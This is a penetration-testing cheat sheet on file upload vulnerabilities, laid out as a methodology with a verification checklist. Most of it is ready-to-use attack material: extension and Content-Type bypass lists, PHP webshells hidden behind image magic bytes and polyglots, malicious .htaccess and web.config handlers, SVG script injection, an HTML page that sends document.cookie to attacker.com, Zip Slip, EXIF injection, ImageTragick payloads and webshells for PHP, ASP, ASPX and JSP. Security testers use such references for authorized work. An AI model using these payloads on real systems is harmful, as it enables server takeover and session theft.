# File Upload Vulnerability Testing Methodology

## Quick Reference

**Dangerous Extensions:**
```
.php, .php5, .phtml, .phar
.asp, .aspx, .ashx
.jsp, .jspx
.cgi, .pl
.svg, .html, .htm
```

**Bypass Techniques:**
- Double extension: `shell.php.jpg`
- Null byte: `shell.php%00.jpg`
- Case variation: `shell.PhP`
- Add valid magic bytes

---

## File Upload Risks

### Remote Code Execution (RCE)
Upload executable file (PHP, ASP, JSP) and access it.

### Cross-Site Scripting (XSS)
Upload HTML/SVG with JavaScript.

### Path Traversal
Upload to arbitrary directory via filename manipulation.

### Denial of Service
Upload extremely large files or zip bombs.

### Overwrite Critical Files
Replace configuration or system files.

---

## Identifying Upload Functionality

### Common Endpoints
```
/upload
/api/upload
/api/files
/import
/avatar
/profile/picture
/media
/attachments
```

### Parameters
```
file, upload, image, document, attachment, media
```

---

## Extension Bypass Techniques

### Double Extensions
```
shell.php.jpg
shell.php.png
shell.php.gif
shell.asp.jpg
```

### Alternative Extensions
```
# PHP
.php, .php2, .php3, .php4, .php5, .php6, .php7
.phps, .pht, .phtm, .phtml, .pgif, .phar
.inc (if executed as PHP)

# ASP
.asp, .aspx, .config, .ashx, .asmx, .aspq
.axd, .cshtm, .cshtml, .rem, .soap, .vbhtm
.vbhtml, .asa, .cer, .shtml

# JSP
.jsp, .jspx, .jsw, .jsv, .jspf, .wss, .do, .action

# Perl/CGI
.cgi, .pl, .pm

# Other
.cfm, .cfml (ColdFusion)
.rb, .rhtml (Ruby)
```

### Case Variations
```
.PhP, .pHp, .PHP, .Php
.AsP, .aSp, .ASP
```

### Null Byte (Legacy)
```
shell.php%00.jpg
shell.php\x00.jpg
shell.php%00.gif
```

### Trailing Characters
```
shell.php.
shell.php..
shell.php...
shell.php (space)
shell.php%20
shell.php%0a
shell.php%0d%0a
```

### Special Characters
```
shell.php;.jpg
shell.php:jpg
shell.php::$DATA (NTFS ADS)
```

### URL Encoding
```
shell.%70%68%70 (shell.php)
```

---

## Content-Type Bypass

### Manipulate Content-Type Header
```
Content-Type: image/jpeg
Content-Type: image/png
Content-Type: image/gif
Content-Type: application/octet-stream
```

### Multiple Content-Type
```
Content-Type: image/jpeg
Content-Type: application/x-php
```

---

## Magic Bytes Bypass

### Add Valid Magic Bytes

```
# GIF
GIF89a<?php system($_GET['cmd']); ?>

# JPEG
\xff\xd8\xff\xe0<?php system($_GET['cmd']); ?>

# PNG
\x89PNG\r\n\x1a\n<?php system($_GET['cmd']); ?>

# BMP
BM<?php system($_GET['cmd']); ?>
```

### Polyglot Files

Create file that's valid as both image and code:

**GIFAR (GIF + JAR):**
```
GIF89a... [valid GIF data] ... [JAR/ZIP at end]
```

**PHP/JPEG Polyglot:**
```php
\xff\xd8\xff\xe0\x00\x10JFIF\x00\x01\x01\x01\x00H\x00H\x00\x00\xff\xfe\x00\x13<?php system($_GET[0]);
```

---

## Filename Manipulation

### Path Traversal in Filename
```
../../../var/www/html/shell.php
....//....//....//var/www/html/shell.php
..%2f..%2f..%2fvar/www/html/shell.php
```

### Overwrite Existing Files
```
.htaccess
web.config
index.php
```

### Windows Reserved Names
```
CON, PRN, AUX, NUL
COM1-COM9, LPT1-LPT9
```

---

## .htaccess Upload

If `.htaccess` upload allowed:

**Execute PHP in .jpg:**
```apache
AddType application/x-httpd-php .jpg
```

**Execute all files as PHP:**
```apache
SetHandler application/x-httpd-php
```

**Enable CGI:**
```apache
Options +ExecCGI
AddHandler cgi-script .jpg
```

---

## web.config Upload (IIS)

```xml
<?xml version="1.0" encoding="UTF-8"?>
<configuration>
  <system.webServer>
    <handlers accessPolicy="Read, Script, Write">
      <add name="web_config" path="*.config" verb="*"
           modules="IsapiModule"
           scriptProcessor="%windir%\system32\inetsrv\asp.dll"
           resourceType="Unspecified" />
    </handlers>
    <security>
      <requestFiltering>
        <fileExtensions>
          <remove fileExtension=".config" />
        </fileExtensions>
      </requestFiltering>
    </security>
  </system.webServer>
</configuration>
```

---

## SVG Upload (XSS)

```xml
<?xml version="1.0" standalone="no"?>
<!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN"
  "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd">
<svg xmlns="http://www.w3.org/2000/svg"
     xmlns:xlink="http://www.w3.org/1999/xlink" version="1.1">
  <script type="text/javascript">
    alert(document.domain);
  </script>
</svg>
```

Or:
```xml
<svg xmlns="http://www.w3.org/2000/svg">
  <a xmlns:xlink="http://www.w3.org/1999/xlink" xlink:href="javascript:alert(1)">
    <rect width="1000" height="1000" fill="white"/>
  </a>
</svg>
```

---

## HTML Upload

```html
<!DOCTYPE html>
<html>
<body>
<script>
document.location='https://attacker.com/steal?cookie='+document.cookie;
</script>
</body>
</html>
```

---

## ZIP/Archive Attacks

### Zip Slip (Path Traversal)
Create zip with path traversal in filename:
```bash
zip slip.zip ../../../var/www/html/shell.php
```

### Zip Bomb
Highly compressed file that expands to huge size.

### Malicious Office Documents
DOCX/XLSX/PPTX are ZIP archives containing XML.

---

## Image-Based Attacks

### EXIF Data Injection
```bash
exiftool -Comment='<?php system($_GET["cmd"]); ?>' image.jpg
```

### ImageMagick Exploits (ImageTragick)
```
push graphic-context
viewbox 0 0 640 480
fill 'url(https://example.com/image.jpg"|ls "-la)'
pop graphic-context
```

Or SVG:
```xml
<?xml version="1.0" standalone="no"?>
<!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN"
  "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd">
<svg width="640px" height="480px" >
  <image xlink:href="https://example.com/image.jpg&quot;|ls &quot;-la"
         x="0" y="0" height="640px" width="480px"/>
</svg>
```

---

## Size and Rate Limits

### File Size Testing
- Upload very large file
- Check for DoS potential
- Check for different size limits

### Concurrent Uploads
- Upload multiple files simultaneously
- Check for race conditions

---

## Finding Upload Location

### Common Paths
```
/uploads/
/files/
/media/
/images/
/static/
/assets/
/content/
```

### Response Headers
Check for `Location` header or response body with file path.

### Predictable Naming
```
/uploads/[timestamp].jpg
/uploads/[username]/[filename]
/uploads/[md5(filename)].jpg
```

---

## Webshell Payloads

### PHP
```php
<?php system($_GET['cmd']); ?>
<?php echo shell_exec($_GET['cmd']); ?>
<?php passthru($_GET['cmd']); ?>
<?=`$_GET[0]`?>
```

### ASP
```asp
<%eval request("cmd")%>
```

### ASPX
```aspx
<%@ Page Language="C#" %>
<%System.Diagnostics.Process.Start("cmd.exe","/c " + Request["cmd"]);%>
```

### JSP
```jsp
<%Runtime.getRuntime().exec(request.getParameter("cmd"));%>
```

---

## Verification Checklist

1. **Identify upload functionality:**
   - [ ] Map all upload endpoints
   - [ ] Note accepted file types

2. **Test extension bypass:**
   - [ ] Double extensions
   - [ ] Alternative extensions
   - [ ] Case variations
   - [ ] Null bytes

3. **Test content bypass:**
   - [ ] Content-Type manipulation
   - [ ] Magic bytes addition
   - [ ] Polyglot files

4. **Test filename manipulation:**
   - [ ] Path traversal
   - [ ] Overwrite attempts

5. **Confirm execution:**
   - [ ] Find uploaded file location
   - [ ] Access and execute
   - [ ] Verify code execution

6. **Document evidence:**
   - [ ] Working upload payload
   - [ ] Code execution proof
   - [ ] Impact description
